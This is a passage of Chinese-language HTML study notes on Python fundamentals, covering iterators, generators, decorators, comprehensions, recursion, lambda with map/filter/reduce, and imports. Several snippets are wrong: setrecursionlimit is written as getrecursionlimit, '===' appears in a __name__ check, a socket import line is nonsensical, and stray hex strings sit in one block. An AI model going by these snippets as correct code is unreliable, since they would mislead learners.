print(d_iterator.__next__())        <span class="hljs-comment"># &#x5185;&#x7F6E;&#x6709;__next__&#x65B9;&#x6CD5;&#x5E76;&#x4E14;&#x5185;&#x7F6E;&#x6709;__iter__&#x65B9;&#x6CD5;&#x7684;&#x5BF9;&#x8C61;&#x662F;&#x8FED;&#x4EE3;&#x5668;&#x5BF9;&#x8C61;</span>
print(d_iterator.__next__())
print(d_iterator.__next__())
print(d_iterator.__next__()) <span class="hljs-comment"># &#x629B;&#x51FA;&#x5F02;&#x5E38;StopIteration</span>

<span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
    <span class="hljs-keyword">try</span>:
        print(d_iterator.__next__())
    <span class="hljs-keyword">except</span> StopIteration:    <span class="hljs-comment"># &#x629B;&#x51FA;&#x5F02;&#x5E38;StopIteration</span>
        <span class="hljs-keyword">break</span>
<span class="hljs-comment"># &#x5728;&#x4E00;&#x4E2A;&#x8FED;&#x4EE3;&#x5668;&#x53D6;&#x503C;&#x53D6;&#x5E72;&#x51C0;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x518D;&#x5BF9;&#x5176;&#x53D6;&#x503C;&#x53D6;&#x4E0D;&#x5230;</span>

<span class="hljs-number">3.2</span> &#x8FED;&#x4EE3;&#x5668;&#x5BF9;&#x8C61;&#xFF1A;&#x5185;&#x7F6E;&#x6709;__next__&#x65B9;&#x6CD5;&#x5E76;&#x4E14;&#x5185;&#x7F6E;&#x6709;__iter__&#x65B9;&#x6CD5;&#x7684;&#x5BF9;&#x8C61;
       &#x8FED;&#x4EE3;&#x5668;&#x5BF9;&#x8C61;.__next__&#xFF08;&#xFF09;&#xFF1A;&#x5F97;&#x5230;&#x8FED;&#x4EE3;&#x5668;&#x7684;&#x4E0B;&#x4E00;&#x4E2A;&#x503C;
       &#x8FED;&#x4EE3;&#x5668;&#x5BF9;&#x8C61;.__iter__&#xFF08;&#xFF09;&#xFF1A;&#x5F97;&#x5230;&#x8FED;&#x4EE3;&#x5668;&#x7684;&#x672C;&#x8EAB;&#xFF0C;&#x8BF4;&#x767D;&#x4E86;&#x8C03;&#x4E86;&#x8DDF;&#x6CA1;&#x8C03;&#x4E00;&#x4E2A;&#x6837;&#x5B50;
</code></pre>
<h5 id="for&#x5FAA;&#x73AF;&#x672C;&#x8D28;">for&#x5FAA;&#x73AF;&#x672C;&#x8D28;</h5>
<pre><code class="lang-python">d={<span class="hljs-string">&apos;a&apos;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&apos;b&apos;</span>:<span class="hljs-number">2</span>,<span class="hljs-string">&apos;c&apos;</span>:<span class="hljs-number">3</span>}

<span class="hljs-comment">#    1&#x3001;d.__iter__()&#x5F97;&#x5230;&#x4E00;&#x4E2A;&#x8FED;&#x4EE3;&#x5668;&#x5BF9;&#x8C61;</span>
<span class="hljs-comment">#    2&#x3001;&#x8FED;&#x4EE3;&#x5668;&#x5BF9;&#x8C61;.__next__()&#x62FF;&#x5230;&#x4E00;&#x4E2A;&#x8FD4;&#x56DE;&#x503C;&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x8BE5;&#x8FD4;&#x56DE;&#x503C;&#x8D4B;&#x503C;&#x7ED9;k</span>
<span class="hljs-comment">#    3&#x3001;&#x5FAA;&#x73AF;&#x5F80;&#x590D;&#x6B65;&#x9AA4;2&#xFF0C;&#x76F4;&#x5230;&#x629B;&#x51FA;StopIteration&#x5F02;&#x5E38;for&#x5FAA;&#x73AF;&#x4F1A;&#x6355;&#x6349;&#x5F02;&#x5E38;&#x7136;&#x540E;&#x7ED3;&#x675F;&#x5FAA;&#x73AF;</span>
<span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> d:
    print(k)
</code></pre>
<h4 id="&#x751F;&#x6210;&#x5668;-&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x8FED;&#x4EE3;&#x5668;">&#x751F;&#x6210;&#x5668;-&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x8FED;&#x4EE3;&#x5668;</h4>
<pre><code class="lang-python">&#x5982;&#x4F55;&#x5F97;&#x5230;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x8FED;&#x4EE3;&#x5668;&#xFF1A;
<span class="hljs-comment"># &#x5728;&#x51FD;&#x6570;&#x5185;&#x4E00;&#x65E6;&#x5B58;&#x5728;yield&#x5173;&#x952E;&#x5B57;&#xFF0C;&#x8C03;&#x7528;&#x51FD;&#x6570;&#x5E76;&#x4E0D;&#x4F1A;&#x6267;&#x884C;&#x51FD;&#x6570;&#x4F53;&#x4EE3;&#x7801;</span>
<span class="hljs-comment"># &#x4F1A;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x751F;&#x6210;&#x5668;&#x5BF9;&#x8C61;&#xFF0C;&#x751F;&#x6210;&#x5668;&#x5373;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x8FED;&#x4EE3;&#x5668;</span>

<span class="hljs-comment"># &#x4F1A;&#x89E6;&#x53D1;&#x51FD;&#x6570;&#x4F53;&#x4EE3;&#x7801;&#x7684;&#x8FD0;&#x884C;&#xFF0C;&#x7136;&#x540E;&#x9047;&#x5230;yield&#x505C;&#x4E0B;&#x6765;&#xFF0C;&#x5C06;yield&#x540E;&#x7684;&#x503C;</span>
<span class="hljs-comment"># &#x5F53;&#x505A;&#x672C;&#x6B21;&#x8C03;&#x7528;&#x7684;&#x7ED3;&#x679C;&#x8FD4;&#x56DE;</span>
</code></pre>
<h5 id="&#x53E0;&#x52A0;&#x591A;&#x4E2A;&#x88C5;&#x9970;&#x5668;&#x5206;&#x6790;">&#x53E0;&#x52A0;&#x591A;&#x4E2A;&#x88C5;&#x9970;&#x5668;&#x5206;&#x6790;</h5>
<pre><code class="lang-python"><span class="hljs-comment"># &#x52A0;&#x8F7D;&#x987A;&#x5E8F;&#x81EA;&#x4E0B;&#x800C;&#x4E0A;(&#x4E86;&#x89E3;)</span>
<span class="hljs-meta">@deco1      # index=deco1(wrapper2&#x7684;&#x5185;&#x5B58;&#x5730;&#x5740;)        ===&gt; index=wrapper1&#x7684;&#x5185;&#x5B58;&#x5730;&#x5740;</span>
<span class="hljs-meta">@deco2      # index=deco2(wrapper3&#x7684;&#x5185;&#x5B58;&#x5730;&#x5740;)        ===&gt; index=wrapper2&#x7684;&#x5185;&#x5B58;&#x5730;&#x5740;</span>
<span class="hljs-meta">@deco3(111) # ===&gt;@outter3===&gt; index=outter3(index) ===&gt; index=wrapper3&#x7684;&#x5185;&#x5B58;&#x5730;&#x5740;</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span><span class="hljs-params">(x,y)</span>:</span>
    print(<span class="hljs-string">&apos;from index %s:%s&apos;</span> %(x,y))

<span class="hljs-comment"># &#x6267;&#x884C;&#x987A;&#x5E8F;&#x81EA;&#x4E0A;&#x800C;&#x4E0B;&#x7684;&#xFF0C;&#x5373;wraper1-&#x300B;wrapper2-&#x300B;wrapper3</span>
index(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>) <span class="hljs-comment"># wrapper1(1,2)</span>

e45e329feb5d925b
a3f549b17b4b3dde
</code></pre>
<h5 id="yield">yield</h5>
<pre><code class="lang-python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dog</span><span class="hljs-params">(name)</span>:</span>
    print(<span class="hljs-string">&apos;&#x9053;&#x54E5;%s&#x51C6;&#x5907;&#x5403;&#x4E1C;&#x897F;&#x5566;...&apos;</span> %name)
    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
        <span class="hljs-comment"># x&#x62FF;&#x5230;&#x7684;&#x662F;yield&#x63A5;&#x6536;&#x5230;&#x7684;&#x503C;</span>
        x = <span class="hljs-keyword">yield</span> <span class="hljs-comment"># x = &apos;&#x8089;&#x5305;&#x5B50;&apos;</span>
        print(<span class="hljs-string">&apos;&#x9053;&#x54E5;%s&#x5403;&#x4E86; %s&apos;</span> %(name,x))


g=dog(<span class="hljs-string">&apos;alex&apos;</span>)
g.send(<span class="hljs-keyword">None</span>) <span class="hljs-comment"># &#x7B49;&#x540C;&#x4E8E;next(g)</span>
</code></pre>
<pre><code class="lang-python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dog</span><span class="hljs-params">(name)</span>:</span>
    print(<span class="hljs-string">&apos;&#x9053;&#x54E5;%s&#x51C6;&#x5907;&#x5403;&#x4E1C;&#x897F;&#x5566;...&apos;</span> %name)
    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
        <span class="hljs-comment"># x&#x62FF;&#x5230;&#x7684;&#x662F;yield&#x63A5;&#x6536;&#x5230;&#x7684;&#x503C;</span>
        x = <span class="hljs-keyword">yield</span> <span class="hljs-comment"># x = &apos;&#x8089;&#x5305;&#x5B50;&apos;</span>
        print(<span class="hljs-string">&apos;&#x9053;&#x54E5;%s&#x5403;&#x4E86; %s&apos;</span> %(name,x))


g=dog(<span class="hljs-string">&apos;alex&apos;</span>)
g.send(<span class="hljs-keyword">None</span>) <span class="hljs-comment"># &#x7B49;&#x540C;&#x4E8E;next(g)</span>

g.send([<span class="hljs-string">&apos;&#x4E00;&#x6839;&#x9AA8;&#x5934;&apos;</span>,<span class="hljs-string">&apos;aaa&apos;</span>])
<span class="hljs-comment"># g.send(&apos;&#x8089;&#x5305;&#x5B50;&apos;)</span>
<span class="hljs-comment"># g.send(&apos;&#x4E00;&#x540C;&#x6CD4;&#x6C34;&apos;)</span>
<span class="hljs-comment"># g.close()</span>
<span class="hljs-comment"># g.send(&apos;1111&apos;) # &#x5173;&#x95ED;&#x4E4B;&#x540E;&#x65E0;&#x6CD5;&#x4F20;&#x503C;</span>
</code></pre>
<h5 id="&#x4E09;&#x5143;&#x8868;&#x8FBE;&#x5F0F;">&#x4E09;&#x5143;&#x8868;&#x8FBE;&#x5F0F;</h5>
<pre><code class="lang-python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span><span class="hljs-params">(x,y)</span>:</span>
    <span class="hljs-keyword">if</span> x &gt; y:
        <span class="hljs-keyword">return</span> x
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> y

res=func(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)
print(res)
----------------------
res=x <span class="hljs-keyword">if</span> x &gt; y <span class="hljs-keyword">else</span> y
print(res)
</code></pre>
<h5 id="&#x5217;&#x8868;&#x751F;&#x6210;&#x5F0F;">&#x5217;&#x8868;&#x751F;&#x6210;&#x5F0F;</h5>
<pre><code class="lang-python">l = [<span class="hljs-string">&apos;alex_dsb&apos;</span>, <span class="hljs-string">&apos;lxx_dsb&apos;</span>, <span class="hljs-string">&apos;wxx_dsb&apos;</span>, <span class="hljs-string">&quot;xxq_dsb&quot;</span>, <span class="hljs-string">&apos;egon&apos;</span>]
new_l=[]
<span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> l:
    <span class="hljs-keyword">if</span> name.endswith(<span class="hljs-string">&apos;dsb&apos;</span>):
        new_l.append(name)
-------------------------------------
l = [<span class="hljs-string">&apos;alex_dsb&apos;</span>, <span class="hljs-string">&apos;lxx_dsb&apos;</span>, <span class="hljs-string">&apos;wxx_dsb&apos;</span>, <span class="hljs-string">&quot;xxq_dsb&quot;</span>, <span class="hljs-string">&apos;egon&apos;</span>]
new_l=[name <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> l <span class="hljs-keyword">if</span> name.endswith(<span class="hljs-string">&apos;dsb&apos;</span>)]
</code></pre>
<h5 id="&#x51FD;&#x6570;&#x7684;&#x9012;&#x5F52;&#x8C03;&#x7528;">&#x51FD;&#x6570;&#x7684;&#x9012;&#x5F52;&#x8C03;&#x7528;</h5>
<blockquote>
<p>&#x51FD;&#x6570;&#x7684;&#x9012;&#x5F52;&#x8C03;&#x7528;&#xFF1A;&#x662F;&#x51FD;&#x6570;&#x5D4C;&#x5957;&#x8C03;&#x7528;&#x7684;&#x4E00;&#x79CD;&#x7279;&#x6B8A;&#x5F62;&#x5F0F;&#xFF0C;&#x5728;&#x8C03;&#x7528;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x53C8;&#x76F4;&#x63A5;&#x6216;&#x8005;&#x95F4;&#x63A5;&#x5730;&#x8C03;&#x7528;&#x5230;&#x672C;&#x8EAB;</p>
<p>&#x6B7B;&#x5FAA;&#x73AF;&#x4E0D;&#x4F1A;&#x65E0;&#x9650;&#x7533;&#x8BF7;&#x5185;&#x5B58;</p>
</blockquote>
<pre><code class="lang-python"><span class="hljs-keyword">import</span> sys        <span class="hljs-comment"># &#x67E5;&#x770B;&#x6700;&#x5927;&#x53EF;&#x9012;&#x5F52;&#x8C03;&#x7528;&#x7684;&#x6B21;&#x6570;</span>
sys.getrecursionlimit()

<span class="hljs-keyword">import</span> sys        <span class="hljs-comment"># &#x8BBE;&#x7F6E;&#x6700;&#x591A;&#x53EF;&#x9012;&#x5F52;&#x7684;&#x6B21;&#x6570;&#x4E3A;2000</span>
sys.getrecursionlimit(<span class="hljs-number">2000</span>)    

&#x9012;&#x5F52;&#x8C03;&#x7528;&#x4E0D;&#x5E94;&#x8BE5;&#x65E0;&#x9650;&#x5730;&#x8C03;&#x7528;&#x4E0B;&#x53BB;&#xFF0C;&#x5FC5;&#x987B;&#x5728;&#x6EE1;&#x8DB3;&#x67D0;&#x79CD;&#x6761;&#x4EF6;&#x4E0B;&#x7ED3;&#x675F;&#x9012;&#x5F52;&#x8C03;&#x7528;

<span class="hljs-comment"># &#x56DE;&#x6EAF;&#xFF1A;&#x4E00;&#x5C42;&#x4E00;&#x5C42;&#x8C03;&#x7528;&#x4E0B;&#x53BB;</span>
<span class="hljs-comment"># &#x9012;&#x63A8;&#xFF1A;&#x6EE1;&#x8DB3;&#x67D0;&#x79CD;&#x7ED3;&#x675F;&#x6761;&#x4EF6;&#xFF0C;&#x7ED3;&#x675F;&#x9012;&#x5F52;&#x8C03;&#x7528;&#xFF0C;&#x7136;&#x540E;&#x4E00;&#x5C42;&#x4E00;&#x5C42;&#x8FD4;&#x56DE;</span>
</code></pre>
<h5 id="&#x4E8C;&#x5206;&#x6CD5;">&#x4E8C;&#x5206;&#x6CD5;</h5>
<p><a href="https://imgtu.com/i/becYIP" target="_blank"><img src="https://s4.ax1x.com/2022/02/27/becYIP.png" alt="becYIP.png"></a></p>
<h5 id="&#x533F;&#x540D;&#x51FD;&#x6570;">&#x533F;&#x540D;&#x51FD;&#x6570;</h5>
<pre><code class="lang-python"><span class="hljs-comment">#    &#x8C03;&#x7528;&#x533F;&#x540D;&#x51FD;&#x6570;</span>
res=(<span class="hljs-keyword">lambda</span> x,y:x+y)(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)
print(res)
&#x533F;&#x540D;&#x7528;&#x4E8E;&#x4E34;&#x65F6;&#x8C03;&#x7528;&#x4E00;&#x6B21;&#x7684;&#x573A;&#x666F;&#xFF1A;&#x66F4;&#x591A;&#x7684;&#x662F;&#x5C06;&#x533F;&#x540D;&#x4E0E;&#x5176;&#x4ED6;&#x51FD;&#x6570;&#x914D;&#x5408;&#x4F7F;&#x7528;

res=max(salaries,key=<span class="hljs-keyword">lambda</span> k:salaries[k])
print(res)

res=min(salaries,key=<span class="hljs-keyword">lambda</span> k:salaries[k])
print(res)
</code></pre>
<h5 id="sorted">sorted</h5>
<pre><code class="lang-python">salaries={
    <span class="hljs-string">&apos;siry&apos;</span>:<span class="hljs-number">3000</span>,
    <span class="hljs-string">&apos;tom&apos;</span>:<span class="hljs-number">7000</span>,
    <span class="hljs-string">&apos;lili&apos;</span>:<span class="hljs-number">10000</span>,
    <span class="hljs-string">&apos;jack&apos;</span>:<span class="hljs-number">2000</span>
}
res=sorted(salaries,key=<span class="hljs-keyword">lambda</span> k:salaries[k],reverse=<span class="hljs-keyword">True</span>)
print(res)
</code></pre>
<h5 id="map">map</h5>
<pre><code class="lang-python">l=[<span class="hljs-string">&apos;alex&apos;</span>,<span class="hljs-string">&apos;lxx&apos;</span>,<span class="hljs-string">&apos;wxx&apos;</span>,<span class="hljs-string">&apos;&#x859B;&#x8D24;&#x59BB;&apos;</span>]
new_l=(name+<span class="hljs-string">&apos;_dsb&apos;</span> <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> l)
print(new_l)

res=map(<span class="hljs-keyword">lambda</span> name:name+<span class="hljs-string">&apos;_dsb&apos;</span>,l)
print(res) <span class="hljs-comment"># &#x751F;&#x6210;&#x5668;</span>
</code></pre>
<h5 id="filter">filter</h5>
<pre><code class="lang-python"><span class="hljs-comment">#    filter&#x4F1A;&#x7559;&#x4E0B;&#x7ED3;&#x679C;&#x4E3A;True&#x7684;</span>
l=[<span class="hljs-string">&apos;alex_sb&apos;</span>,<span class="hljs-string">&apos;lxx_sb&apos;</span>,<span class="hljs-string">&apos;wxx&apos;</span>,<span class="hljs-string">&apos;&#x859B;&#x8D24;&#x59BB;&apos;</span>]
res=(name <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> l <span class="hljs-keyword">if</span> name.endswith(<span class="hljs-string">&apos;sb&apos;</span>))
print(res)

res=filter(<span class="hljs-keyword">lambda</span> name:name.endswith(<span class="hljs-string">&apos;sb&apos;</span>),l)
print(res)
</code></pre>
<h5 id="reduce">reduce</h5>
<pre><code class="lang-python"><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce
res=reduce(<span class="hljs-keyword">lambda</span> x,y:x+y,[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],<span class="hljs-number">10</span>) <span class="hljs-comment"># 16</span>
print(res)

res=reduce(<span class="hljs-keyword">lambda</span> x,y:x+y,[<span class="hljs-string">&apos;a&apos;</span>,<span class="hljs-string">&apos;b&apos;</span>,<span class="hljs-string">&apos;c&apos;</span>]) <span class="hljs-comment"># &apos;a&apos;,&apos;b&apos;</span>
print(res)
</code></pre>
<h5 id="&#x6A21;&#x5757;&#x548C;&#x5305;">&#x6A21;&#x5757;&#x548C;&#x5305;</h5>
<pre><code class="lang-python">&#x4E00;&#x4E2A;python&#x6587;&#x4EF6;&#x672C;&#x8EAB;&#x5C31;&#x4E00;&#x4E2A;&#x6A21;&#x5757;&#xFF0C;&#x6587;&#x4EF6;&#x540D;m.py&#xFF0C;&#x6A21;&#x5757;&#x540D;&#x53EB;m&#xFF0C;&#x6A21;&#x5757;&#x6709;&#x56DB;&#x79CD;&#x5F62;&#x5F0F;&#xFF1A;
<span class="hljs-number">1</span> &#x4F7F;&#x7528;python&#x7F16;&#x5199;&#x7684;.py&#x6587;&#x4EF6;
<span class="hljs-number">2</span> &#x5DF2;&#x88AB;&#x7F16;&#x8BD1;&#x4E3A;&#x5171;&#x4EAB;&#x5E93;&#x6216;DLL&#x7684;C&#x6216;C++&#x6269;&#x5C55;
<span class="hljs-number">3</span> &#x628A;&#x4E00;&#x7CFB;&#x5217;&#x6A21;&#x5757;&#x7EC4;&#x7EC7;&#x5230;&#x4E00;&#x8D77;&#x7684;&#x6587;&#x4EF6;&#x5939;&#xFF08;&#x6CE8;&#xFF1A;&#x6587;&#x4EF6;&#x5939;&#x4E0B;&#x6709;&#x4E00;&#x4E2A;__init__.py&#x6587;&#x4EF6;&#xFF0C;&#x8BE5;&#x6587;&#x4EF6;&#x5939;&#x79F0;&#x4E4B;&#x4E3A;&#x5305;&#xFF09;
<span class="hljs-number">4</span> &#x4F7F;&#x7528;C&#x7F16;&#x5199;&#x5E76;&#x94FE;&#x63A5;&#x5230;python&#x89E3;&#x91CA;&#x5668;&#x7684;&#x5185;&#x7F6E;&#x6A21;&#x5757;

I:&#x5185;&#x7F6E;&#x4E0E;&#x7B2C;&#x4E09;&#x7684;&#x6A21;&#x5757;&#x62FF;&#x6765;&#x5C31;&#x7528;&#xFF0C;&#x65E0;&#x9700;&#x5B9A;&#x4E49;&#xFF0C;&#x8FD9;&#x79CD;&#x62FF;&#x6765;&#x4E3B;&#x4E49;&#xFF0C;&#x53EF;&#x4EE5;&#x6781;&#x5927;&#x5730;&#x63D0;&#x5347;&#x81EA;&#x5DF1;&#x7684;&#x5F00;&#x53D1;&#x6548;&#x7387;
II:&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x6A21;&#x5757;
    &#x53EF;&#x4EE5;&#x5C06;&#x7A0B;&#x5E8F;&#x7684;&#x5404;&#x90E8;&#x5206;&#x529F;&#x80FD;&#x63D0;&#x53D6;&#x51FA;&#x6765;&#x653E;&#x5230;&#x4E00;&#x6A21;&#x5757;&#x4E2D;&#x4E3A;&#x5927;&#x5BB6;&#x5171;&#x4EAB;&#x4F7F;&#x7528;
    &#x597D;&#x5904;&#x662F;&#x51CF;&#x5C11;&#x4E86;&#x4EE3;&#x7801;&#x5197;&#x4F59;&#xFF0C;&#x7A0B;&#x5E8F;&#x7EC4;&#x7EC7;&#x7ED3;&#x6784;&#x66F4;&#x52A0;&#x6E05;&#x6670;

<span class="hljs-comment"># &#x4E00;&#x4E2A;python&#x6587;&#x4EF6;&#x6709;&#x4E24;&#x79CD;&#x7528;&#x9014;</span>
<span class="hljs-comment"># 1&#x3001;&#x88AB;&#x5F53;&#x6210;&#x7A0B;&#x5E8F;&#x8FD0;&#x884C;</span>
<span class="hljs-comment"># 2&#x3001;&#x88AB;&#x5F53;&#x505A;&#x6A21;&#x5757;&#x5BFC;&#x5165;</span>

<span class="hljs-comment">#1&#x3001;&#x4EA7;&#x751F;&#x4E00;&#x4E2A;&#x540D;&#x79F0;&#x7A7A;&#x95F4;</span>
<span class="hljs-comment">#2&#x3001;&#x8FD0;&#x884C;&#x5305;&#x4E0B;&#x7684;__init__.py&#x6587;&#x4EF6;&#xFF0C;&#x5C06;&#x8FD0;&#x884C;&#x8FC7;&#x7A0B;&#x4E2D;&#x4EA7;&#x751F;&#x7684;&#x540D;&#x5B57;&#x90FD;&#x4E22;&#x5230;1&#x7684;&#x540D;&#x79F0;&#x7A7A;&#x95F4;&#x4E2D;</span>
<span class="hljs-comment">#3&#x3001;&#x5728;&#x5F53;&#x524D;&#x6267;&#x884C;&#x6587;&#x4EF6;&#x7684;&#x540D;&#x79F0;&#x7A7A;&#x95F4;&#x4E2D;&#x62FF;&#x5230;&#x4E00;&#x4E2A;&#x540D;&#x5B57;mmm&#xFF0C;mmm&#x6307;&#x5411;1&#x7684;&#x540D;&#x79F0;&#x7A7A;&#x95F4;</span>

&#x5728;&#x5BFC;&#x5165;&#x65F6;&#x5E26;.&#xFF0C;&#x5DE6;&#x8FB9;&#x5FC5;&#x987B;&#x662F;&#x5305;
<span class="hljs-keyword">from</span> foo.m1 <span class="hljs-keyword">import</span> f1

&#x7EDD;&#x5BF9;&#x5BFC;&#x5165;&#x548C;&#x76F8;&#x5BF9;&#x5BFC;&#x5165;
&#x7EDD;&#x5BF9;&#x5BFC;&#x5165;&#x524D;&#xFF0C;&#x53EF;&#x4EE5;&#x628A;&#x6A21;&#x5757;&#x7684;&#x8DEF;&#x5F84;&#x6DFB;&#x52A0;&#x5230;&#x5185;&#x5B58;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x4E2D;
&#x76F8;&#x5BF9;&#x5BFC;&#x5165;&#xFF1A;
<span class="hljs-keyword">from</span> .m1 <span class="hljs-keyword">import</span> f1    <span class="hljs-comment">#    &#x8FD9;&#x91CC;.m1&#x8868;&#x793A;&#x5728;&#x5F53;&#x524D;&#x8DEF;&#x5F84;&#x4E0B;&#x627E;m1</span>
<span class="hljs-keyword">from</span> ..m2 <span class="hljs-keyword">import</span> f1    <span class="hljs-comment">#    &#x8FD9;&#x91CC;..m2&#x8868;&#x793A;&#x5728;&#x4E0A;&#x4E00;&#x7EA7;&#x76EE;&#x5F55;&#x4E0B;&#x627E;m2</span>

&#x5305;&#x5185;&#x4E4B;&#x95F4;&#x4E92;&#x76F8;&#x5BFC;&#x5165;&#x63A8;&#x8350;&#x76F8;&#x5BF9;&#x5BFC;&#x5165;
</code></pre>
<h6 id="name">name</h6>
<pre><code class="lang-python">&#x5F53;&#x6587;&#x4EF6;&#x8FD0;&#x884C;&#x65F6;__name__ == <span class="hljs-string">&apos;__main__&apos;</span>
&#x5F53;&#x6587;&#x4EF6;&#x88AB;&#x5F53;&#x6210;&#x6A21;&#x5757;&#x65F6;&#xFF0C;__name__ == &#x6A21;&#x5757;&#x540D;

<span class="hljs-keyword">if</span> __name__ === <span class="hljs-string">&apos;__main__&apos;</span>:
      print(<span class="hljs-string">&apos;&#x6587;&#x4EF6;&#x88AB;&#x6267;&#x884C;&apos;</span>)
    get()
    change()
<span class="hljs-keyword">else</span>:
  print(<span class="hljs-string">&quot;&#x6587;&#x4EF6;&#x88AB;&#x5BFC;&#x5165;&quot;</span>)
  <span class="hljs-keyword">pass</span>
</code></pre>
<h6 id="from--import-">from ... import ...</h6>
<pre><code class="lang-python"><span class="hljs-comment"># import&#x5BFC;&#x5165;&#x6A21;&#x5757;&#x5728;&#x4F7F;&#x7528;&#x65F6;&#x5FC5;&#x987B;&#x52A0;&#x524D;&#x7F00;&quot;&#x6A21;&#x5757;.&quot;</span>
<span class="hljs-comment"># &#x4F18;&#x70B9;&#xFF1A;&#x80AF;&#x5B9A;&#x4E0D;&#x4F1A;&#x4E0E;&#x5F53;&#x524D;&#x540D;&#x79F0;&#x7A7A;&#x95F4;&#x4E2D;&#x7684;&#x540D;&#x5B57;&#x51B2;&#x7A81;</span>
<span class="hljs-comment"># &#x7F3A;&#x70B9;&#xFF1A;&#x52A0;&#x524D;&#x7F00;&#x663E;&#x5F97;&#x9EBB;&#x70E6;</span>

<span class="hljs-comment"># from ... import ...&#x5BFC;&#x5165;&#x4E5F;&#x53D1;&#x751F;&#x4E86;&#x4E09;&#x4EF6;&#x4E8B;</span>
<span class="hljs-comment"># 1&#x3001;&#x4EA7;&#x4E00;&#x4E2A;&#x6A21;&#x5757;&#x7684;&#x540D;&#x79F0;&#x7A7A;&#x95F4;</span>
<span class="hljs-comment"># 2&#x3001;&#x8FD0;&#x884C;foo.py&#x5C06;&#x8FD0;&#x884C;&#x8FC7;&#x7A0B;&#x4E2D;&#x4EA7;&#x751F;&#x7684;&#x540D;&#x5B57;&#x90FD;&#x4E22;&#x5230;&#x6A21;&#x5757;&#x7684;&#x540D;&#x79F0;&#x7A7A;&#x95F4;&#x53BB;</span>
<span class="hljs-comment"># 3&#x3001;&#x5728;&#x5F53;&#x524D;&#x540D;&#x79F0;&#x7A7A;&#x95F4;&#x62FF;&#x5230;&#x4E00;&#x4E2A;&#x540D;&#x5B57;&#xFF0C;&#x8BE5;&#x540D;&#x5B57;&#x4E0E;&#x6A21;&#x5757;&#x540D;&#x79F0;&#x7A7A;&#x95F4;&#x4E2D;&#x7684;&#x67D0;&#x4E00;&#x4E2A;&#x5185;&#x5B58;&#x5730;&#x5740;</span>

&#x591A;&#x6B21;&#x5BFC;&#x5165;&#xFF0C;&#x5168;&#x90E8;&#x5BFC;&#x5165;&#xFF0C;&#x8D77;&#x522B;&#x540D;
<span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> foo,<span class="hljs-keyword">pass</span>,test
<span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> socket <span class="hljs-keyword">import</span> xxx <span class="hljs-keyword">as</span> f

&#x88AB;&#x5BFC;&#x5165;&#x6A21;&#x5757;&#x5185;&#x90E8;&#x5B58;&#x5728;&#x4E00;&#x4E2A;__all__&#x7684;&#x5217;&#x8868;,&#x5217;&#x8868;&#x5185;&#x90E8;&#x7684;&#x503C;&#x662F;&#x6A21;&#x5757;&#x5185;&#x90E8;&#x7684;&#x540D;&#x5B57;
__all__ = [<span class="hljs-string">&apos;x&apos;</span>,<span class="hljs-string">&apos;get&apos;</span>,<span class="hljs-string">&apos;change&apos;</span>]
</code></pre>
<h6 id="&#x4F18;&#x5148;&#x7EA7;">&#x4F18;&#x5148;&#x7EA7;</h6>
<pre><code class="lang-python"><span class="hljs-comment"># &#x65E0;&#x8BBA;&#x662F;import&#x8FD8;&#x662F;from...import&#x5728;&#x5BFC;&#x5165;&#x6A21;&#x5757;&#x65F6;&#x90FD;&#x6D89;&#x53CA;&#x5230;&#x67E5;&#x627E;&#x95EE;&#x9898;</span>
<span class="hljs-comment"># &#x4F18;&#x5148;&#x7EA7;&#xFF1A;</span>
<span class="hljs-comment"># 1&#x3001;&#x5185;&#x5B58;&#xFF08;&#x5185;&#x7F6E;&#x6A21;&#x5757;&#xFF09;</span>
<span class="hljs-comment"># 2&#x3001;&#x786C;&#x76D8;&#xFF1A;&#x6309;&#x7167;sys.path&#x4E2D;&#x5B58;&#x653E;&#x7684;&#x6587;&#x4EF6;&#x7684;&#x987A;&#x5E8F;&#x4F9D;&#x6B21;&#x67E5;&#x627E;&#x8981;&#x5BFC;&#x5165;&#x7684;&#x6A21;&#x5757;</span>

<span class="hljs-keyword">import</span> sys
<span class="hljs-comment">#&#x503C;&#x4E3A;&#x4E00;&#x4E2A;&#x5217;&#x8868;&#xFF0C;&#x5B58;&#x653E;&#x4E86;&#x4E00;&#x7CFB;&#x5217;&#x7684;&#x5BF9;&#x6587;&#x4EF6;&#x5939;</span>
<span class="hljs-comment">#&#x5176;&#x4E2D;&#x7B2C;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x5939;&#x662F;&#x5F53;&#x524D;&#x6267;&#x884C;&#x6587;&#x4EF6;&#x6240;&#x5728;&#x7684;&#x6587;&#x4EF6;&#x5939;</span>
print(sys.path)

